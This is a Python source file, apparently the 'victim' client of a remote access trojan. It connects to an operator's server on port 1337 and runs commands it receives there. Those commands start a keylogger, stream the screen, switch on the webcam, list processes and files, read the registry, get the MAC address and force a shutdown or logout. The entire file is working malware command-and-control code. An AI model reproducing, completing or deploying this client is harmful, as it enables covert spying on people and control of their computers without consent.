import socket

import webcam_client as wc

from socket_email.victim import app_process_client as ap
from socket_email.victim import directory_tree_client as dt
from socket_email.victim import keylogger_client as kl
from socket_email.victim import live_screen_client as lss
from socket_email.victim import mac_address_client as mac
from socket_email.victim import registry_client as rs
from socket_email.victim import shutdown_logout_client as sl

# Global variables
global client
BUFSIZ = 1024 * 4


def keylogger():
    global client
    kl.keylog(client)
    return


def shutdown_logout(conn, msg):
    global client
    sl.shutdown_logout(conn, msg)
    return


def mac_address():
    global client
    mac.mac_address(client)
    return


def app_process():
    global client
    ap.app_process(client)
    return


def live_screen():
    global client
    lss.capture_screen(client)
    return


def directory_tree():
    global client
    dt.directory_handle(client)
    return


def registry():
    global client
    rs.registry_handle(client)
    return


def webcam():
    global client
    wc.run(client)
    return


# Connect
###############################################################################
def Connect():
    global client
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client.connect(("127.0.0.1", 1337))  # Change ip to correct server IP
    print("[?] Client connected!")
    while True:
        msg = client.recv(BUFSIZ).decode("utf8")
        print("[*] Recv: ", msg)
        if "KEYLOG" in msg:
            keylogger()
        elif "SD_LO" in msg:
            shutdown_logout(client, msg)
        elif "LIVESCREEN" in msg:
            live_screen()
        elif "APP_PRO" in msg:
            app_process()
        elif "MAC" in msg:
            mac_address()
        elif "DIRECTORY" in msg:
            directory_tree()
        elif "REGISTRY" in msg:
            registry()
        elif "SHUTDOWN" in msg or "LOGOUT" in msg or "RESTART" in msg:
            shutdown_logout(client, msg)
        elif "WEBCAM" in msg:
            webcam()
        elif "QUIT" in msg:
            client.close()
            return
        else:
            print("ERROR ?")  # Debugging shutdown (server close connect first)
            client.close()
            return


###############################################################################

Connect()
